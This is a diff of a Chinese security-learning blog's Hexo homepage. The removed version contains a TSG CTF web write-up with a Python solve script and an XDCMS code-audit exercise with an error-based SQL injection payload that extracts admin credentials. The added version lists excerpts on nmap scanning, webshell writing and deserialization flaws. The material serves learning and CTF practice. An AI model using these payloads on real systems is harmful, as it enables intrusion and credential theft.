-<p>例如，<code>IArticleCateDao</code> 的 <code>list()</code>方法被调用，那么就会找到 <code>ArticleCateMapper.xml</code>中 <code>id</code>等于 <code>list</code> 的方法，执行它的 <code>SQL</code>，然后根据 <code>resultMap</code> 描述的 <em>字段-属性</em> 映射关系，返回相应的实例对象。</p>
-<p>这里的 <code>resultMap</code> 具体如下：</p>
-<pre><code>&lt;resultMap id=&quot;ArticleCateResult&quot; type=&quot;ArticleCate&quot;&gt;
-    &lt;id column=&quot;id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;id&quot; /&gt;
-    &lt;result column=&quot;fid&quot; jdbcType=&quot;INTEGER&quot; property=&quot;fid&quot; /&gt;
-    &lt;result column=&quot;name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;name&quot; /&gt;
-    &lt;result column=&quot;status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;status&quot; /&gt;
-    &lt;result column=&quot;sort&quot; jdbcType=&quot;INTEGER&quot; property=&quot;sort&quot; /&gt;
-&lt;/resultMap&gt;</code></pre><p>其中，<code>id</code>属性是该映射的名称，<code>type</code>属性代表映射的类。里面有 <code>5</code> 个子元素，<code>id</code>元素映射到<code>ArticleCate</code>的<code>id</code>属性。其它四个<code>result</code>元素中的<code>column</code>属性会映射到对应的<code>property</code>属性。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/26/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8(%E4%B8%80)/" data-id="ckemqkeak000basty60dd7wp8" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-TSGctf web" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/14/TSGctf%20web/" class="article-date">
-  <time datetime="2020-07-14T01:59:06.648Z" itemprop="datePublished">2020-07-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>TSGctf web</p>
-<p>Code：</p>
-<pre><code>const fastify = require(&#39;fastify&#39;);
-const nunjucks = require(&#39;nunjucks&#39;);
-const crypto = require(&#39;crypto&#39;);
-
-
-const converters = &#123;&#125;;
-
-const flagConverter = (input, callback) =&gt; &#123;
-  const flag = &#39;*** CENSORED ***&#39;;
-  callback(null, flag);
-&#125;;
-
-const base64Converter = (input, callback) =&gt; &#123;
-  try &#123;
-    const result = Buffer.from(input).toString(&#39;base64&#39;);
-    callback(null, result)
-  &#125; catch (error) &#123;
-    callback(error);
-  &#125;
-&#125;;
-
-const scryptConverter = (input, callback) =&gt; &#123;
-  crypto.scrypt(input, &#39;I like sugar&#39;, 64, (error, key) =&gt; &#123;
-    if (error) &#123;
-      callback(error);
-    &#125; else &#123;
-      callback(null, key.toString(&#39;hex&#39;));
-    &#125;
-  &#125;);
-&#125;;
-
-
-const app = fastify();
-app.register(require(&#39;point-of-view&#39;), &#123;engine: &#123;nunjucks&#125;&#125;);
-app.register(require(&#39;fastify-formbody&#39;));
-app.register(require(&#39;fastify-cookie&#39;));
-app.register(require(&#39;fastify-session&#39;), &#123;secret: Math.random().toString(2), cookie: &#123;secure: false&#125;&#125;);
-
-app.get(&#39;/&#39;, async (request, reply) =&gt; &#123;
-  reply.view(&#39;index.html&#39;, &#123;sessionId: request.session.sessionId&#125;);
-&#125;);
-
-app.post(&#39;/&#39;, async (request, reply) =&gt; &#123;
-  if (request.body.converter.match(/[FLAG]/)) &#123;
-    throw new Error(&quot;Don&#39;t be evil :)&quot;);
-  &#125;
-
-  if (request.body.input.length &lt; 10) &#123;
-    throw new Error(&#39;Too short :(&#39;);
-  &#125;
-
-  if (request.body.input.length &gt; 1000) &#123;
-    throw new Error(&#39;Too long :(&#39;);
-  &#125;
-
-  converters[&#39;base64&#39;] = base64Converter;
-  converters[&#39;scrypt&#39;] = scryptConverter;
-  converters[`FLAG_$&#123;request.session.sessionId&#125;`] = flagConverter;
-
-  const result = await new Promise((resolve, reject) =&gt; &#123;
-    converters[request.body.converter](request.body.input, (error, result) =&gt; &#123;
-      if (error) &#123;
-        reject(error);
-      &#125; else &#123;
-        resolve(result);
-      &#125;
-    &#125;);
-  &#125;);
-
-  reply.view(&#39;index.html&#39;, &#123;
-    input: request.body.input,
-    result,
-    sessionId: request.session.sessionId,
-  &#125;);
-&#125;);
-
-app.setErrorHandler((error, request, reply) =&gt; &#123;
-  reply.view(&#39;index.html&#39;, &#123;error, sessionId: request.session.sessionId&#125;);
-&#125;);
-
-app.listen(59101, &#39;0.0.0.0&#39;);</code></pre><p>I never expected to be able to read JS, but because of the foundation of learning other languages, I was able to understand this simple code, so I wanted others to try it out.</p>
-<p>1.By reading the source code, we can easily find several key points.</p>
-<pre><code>const flagConverter = (input, callback) =&gt; &#123;
-  const flag = &#39;*** CENSORED ***&#39;;
-  callback(null, flag);
-&#125;;</code></pre><pre><code>app.post(&#39;/&#39;, async (request, reply) =&gt; &#123;
-  if (request.body.converter.match(/[FLAG]/)) &#123;
-    throw new Error(&quot;Don&#39;t be evil :)&quot;);
-  &#125;</code></pre><pre><code> converters[&#39;base64&#39;] = base64Converter;
-  converters[&#39;scrypt&#39;] = scryptConverter;
-  converters[`FLAG_$&#123;request.session.sessionId&#125;`] = flagConverter;</code></pre><p>So we need to bypass FLAG filtering. But I know little about JS. I didn’t know until after the game:</p>
-<ol>
-<li>Objects have multiple intrinsic JS function, one of them can be used to spit out the flag in errors :)</li>
-</ol>
-<pre><code>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__</code></pre><p>The defineSetter function of any object is way to do extra things in callback when a values are assigned to its keys.</p>
-<pre><code>var o = &#123;&#125;;
-o.__defineSetter__(&#39;key&#39;, function(value) &#123; //we access value in callback &#125;);</code></pre><p>So following code</p>
-<pre><code>converters[request.body.converter](request.body.input, (error, result) =&gt; &#123;
-      if (error) &#123;
-        reject(error);
-      &#125; else &#123;
-        resolve(result);
-      &#125;
-    &#125;);</code></pre><p>with <code>request.body.converter = __defineSetter__</code> and <code>request.body.input = FLAG_sessionId</code></p>
-<p>will assign following callback for whenever converter object gets key <code>FLAG_sessionId</code> assigned a value.</p>
-<pre><code>(error, result) =&gt; &#123;
-      if (error) &#123;
-        reject(error);
-      &#125; else &#123;
-        resolve(result);
-      &#125;
-    &#125;);</code></pre><p>In the first request, We just assign the callback and the Promise does not gets resolved so we are stuck at <code>const result = await new Promise((resolve, reject)</code></p>
-<p>In the second consecutive request, The code <code>converters[</code>FLAG_${request.session.sessionId}<code>] = flagConverter;</code></p>
-<p>will assign the value <code>flagConverter</code> function to our unique key for which we have set a callback, this <code>flagConverter</code> function will get passed down to callback as error and Our Promise will get rejected and the result gets assign with the whole function, and this result gets spit out in response to our first request which was waiting for this to happen.</p>
-<p>In the first request, We just assign the callback and the Promise does not gets resolved so we are stuck at <code>const result = await new Promise((resolve, reject)</code></p>
-<p>In the second consecutive request, The code <code>converters[</code>FLAG_${request.session.sessionId}<code>] = flagConverter;</code></p>
-<p>will assign the value <code>flagConverter</code> function to our unique key for which we have set a callback, this <code>flagConverter</code> function will get passed down to callback as error and Our Promise will get rejected and the result gets assign with the whole function, and this result gets spit out in response to our first request which was waiting for this to happen.</p>
-<pre><code class="python">import threading
-import requests
-import time 
-cookie = &#123;&quot;sessionId&quot; : &quot;HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa.YTlYOIhk52YHs3NzP%2FFPuu6y7MK1ev6uX21jHbgxMXE&quot;&#125;
-def sendPayload():    
-    r = requests.post(&quot;http://34.85.124.174:59101&quot;,json=       &#123;&quot;converter&quot;:&quot;__defineSetter__&quot;,&quot;input&quot;:&quot;FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa&quot;&#125;,cookies=cookie)    
-    print(r.text) threading.Thread(target=sendPayload).start()time.sleep(1)requests.post(&quot;http://34.85.124.174:59101&quot;,json=&#123;&quot;converter&quot;:&quot;base64&quot;,&quot;input&quot;:&quot;FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa&quot;&#125;,cookies=cookie)</code></pre>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/14/TSGctf%20web/" data-id="ckemqkeat000wastyapuk86e1" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-代码审计练习（一）" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/06/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
-  <time datetime="2020-06-23T03:15:55.378Z" itemprop="datePublished">2020-06-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="代码审计练习（一）"><a href="#代码审计练习（一）" class="headerlink" title="代码审计练习（一）"></a>代码审计练习（一）</h1><h2 id="XDCMS"><a href="#XDCMS" class="headerlink" title="XDCMS"></a>XDCMS</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623103752008.png" alt="image-20200623103752008"></p>
-<p>先打开index.php，有代码知先坚持config.inc.php是否存在不存在则跳转到安装页面。打开commmon.inc.php看一下。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104149304.png" alt="image-20200623104149304"></p>
-<p>再打开xdcms.inc.php，有提示打开fun.inc.php，在该文件中，对接收参数使用safe_html()和save_replace()函数进行过滤。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104541913.png" alt="image-20200623104541913"></p>
-<p>可以看到这里进行了过滤。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104616205.png" alt="image-20200623104616205"></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623104648257.png" alt="image-20200623104648257"></p>
-<p>在global.inc.php文件中知对get进行了过滤没有进行POST的过滤。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105333159.png" alt="image-20200623105333159"></p>
-<p>fileds没有过滤</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105453088.png" alt="image-20200623105453088"></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623105635301.png" alt="image-20200623105635301"></p>
-<p>在主页面进行会员注册。数据库报错,但是信息还是可以提交到数据库，会员注册成功，说明没有对提交的特殊字符进行过滤。由数据库报错信息可知，提交的信息是提交到表c_member中。</p>
-<p>在源码中查找query</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200623110247381.png" alt="image-20200623110247381"></p>
-<p>考虑到使用数据库报错进行注入，利用代码如下：</p>
-<p><code>update c_member set truename=&#39;simple&#39;,eamil=&#39;3456&#39; where userid=9 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x3a,encrypt,0x27,0x7e) from c_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#where userid=9</code></p>
-<p>在xdcms数据库执行利用代码。返回报错信息，在网页上执行利用代码：</p>
-<p><code>56&#39; where userid=9 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,password,0x3a,encrypt,0x27,0x7e) from c_admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></p>
-<p>显示注册成功。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/06/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckemqkebi002fastybj6basjn" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-  </nav>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%EF%BC%8Cpython/">WEB，python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb/">攻防世界，web</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jarvis-OJ/" rel="tag">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%EF%BC%8Cphp/" rel="tag">WEB，php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%EF%BC%8Cupload/" rel="tag">WEB，upload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuctf/" rel="tag">buuctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%EF%BC%8CJARvis-OJ/" rel="tag">web，JARvis OJ</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/Jarvis-OJ/" style="font-size: 13.33px;">Jarvis OJ</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/WEB/" style="font-size: 20px;">WEB</a> <a href="/tags/WEB%EF%BC%8Cphp/" style="font-size: 10px;">WEB，php</a> <a href="/tags/WEB%EF%BC%8Cupload/" style="font-size: 13.33px;">WEB，upload</a> <a href="/tags/buuctf/" style="font-size: 10px;">buuctf</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/web%EF%BC%8CJARvis-OJ/" style="font-size: 10px;">web，JARvis OJ</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/08/11/%5BMRCTF2020%5DEzpop_Reveng/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89XXE/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/07/Java%E5%8F%8D%E5%B0%84%E7%9A%84%E5%AD%A6%E4%B9%A0/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/01/Webgoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2020/07/31/Webgoat8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/">(no title)</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 小叹<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-  </div>
-</body>
-</html>
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="小叹" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-comment-dotso"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 关系</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://tva1.sinaimg.cn/large/008eGmZEly1gobclvtltbj31c00u0ahu.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">小叹</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-comment-dotso"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 关系</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">小叹</h1><div id="site_social_icons"><a class="social-icon" href="https://github.com/York145" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/2192557290@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/07/28/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" title="No title">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/07/28/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" title="No title">No title</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-07-28T08:03:56.288Z" title="Created 2021-07-28 16:03:56">2021-07-28</time></span></div><div class="content">Weblogic T3 反序列化学习前言最近在公司实习也没有太多事情，就来学习一下Weblogic听好多师傅讲过很多次了。
+这里我使用的是ATEAM大哥开源的搭建工具，感谢前人提供的便捷。我这里本来打算在自己电脑上搭建，但是说多了都是泪，m1适配问题。。。。最后还是跑云服务器上进行了搭建。
+搭建过程下载文件先从GitHub上面拉取项目，拉取之后创建两个文件夹jdks,weblogics。
+
+jdk下载地址： https://www.oracle.com/technetwork/java/javase/archive-139210.html
+weblogic下载地址：https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html
+
+然后将文件夹放到云服务器上后。
+镜像搭建
+sudo docker build –build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz –build-arg WEBLOGIC_JAR=wls1036_generic ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/" title="ATT&amp;CK红队评估实战靶场（一） 练习">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ATT&amp;CK红队评估实战靶场（一） 练习"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/" title="ATT&amp;CK红队评估实战靶场（一） 练习">ATT&amp;CK红队评估实战靶场（一） 练习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-07-24T11:31:01.000Z" title="Created 2021-07-24 19:31:01">2021-07-24</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a></span></div><div class="content">ATT&amp;CK红队评估实战靶场（一） 练习前言已经一个月没有写东西啦，因为期末考试加上自己的项目还有考完还有学校的课程内容一直蛮忙的，一直到16号才放假，上个星期还去安恒实习了，就打算乘着双休搭建一个靶机，想学内网好久了，一直都没有上手操作，这边实际上操作一遍，但是下面的内容还是很蠢的也没有什么值得学习的操作，纯粹是我第一次上手进行内网学习的记录。
+开始首先使用nmap进行扫描，使用的命令如下：
+
+nmap -sP 192.168.1.0/24
+
+对192.168.1.0网段进行扫描使用的参数说-sP，使用的是ICMP协议发送echo包来探测的，但是这样不能扫描出禁ping的主机所以要注意一下。
+
+这里可以看见靶机的IP是192.168.1.130，我们继续用nmap扫描一下具体的服务
+
+namp -sV 192.168.1.130
+
+可以看见开放啦80端口和3306端口先访问看看。使用dirsearch爆破一下，发现了phpmyadmin，随手检测一波弱口令就进去啦（因为是靶机的缘故hh）去看看数据库日志文件的位置，很基础的操作写入shell，没什么好说的。
+通过日志文件写入s ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Shiro反序列化漏洞学习">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro反序列化漏洞学习"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Shiro反序列化漏洞学习">Shiro反序列化漏洞学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-06-13T11:16:01.000Z" title="Created 2021-06-13 19:16:01">2021-06-13</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Java/">Java</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%82%A6%E8%AF%BB/">悦读</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/web/">web</a></span></div><div class="content">Shiro反序列化漏洞学习前言最近临近期末，事情变得很多，到了大二后感觉事情明显变多了，感觉人也很累，已经很久没有更新文章了，记得刚刚开始写博客是大一的时候，刚刚开始写博客也只是瞎搞，慢慢的开始注意到自己不能继续下去，于是就删除了以前的文章。尽管现在的文章质量也还是很低，但是希望自己能够慢慢进步。最近不仅要忙期末考试的事情、还要写项目，开始写项目发现自己的代码功底还是很弱，希望能在大三中改善这点。
+shiro简介简而言之，Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。
+Shiro能到底能做些什么呢？
+
+验证用户身份
+用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限
+在非 Web 或 EJB 容器的环境下可以任意使用Session API
+可以响应认证、访问控制，或者 Session 生命周期中发生的事件
+可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)
+支持单点登录(SSO)功能
+支持提供“Remember Me”服务，获取用户关联信息而无需登录
+
+具体 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" title="Java agent学习">     <img class="post_bg" src="https://tva1.sinaimg.cn/large/008eGmZEly1gobcme930kj31hc0u04cl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java agent学习"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/" title="Java agent学习">Java agent学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2021-05-09T06:31:01.000Z" title="Created 2021-05-09 14:31:01">2021-05-09</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas 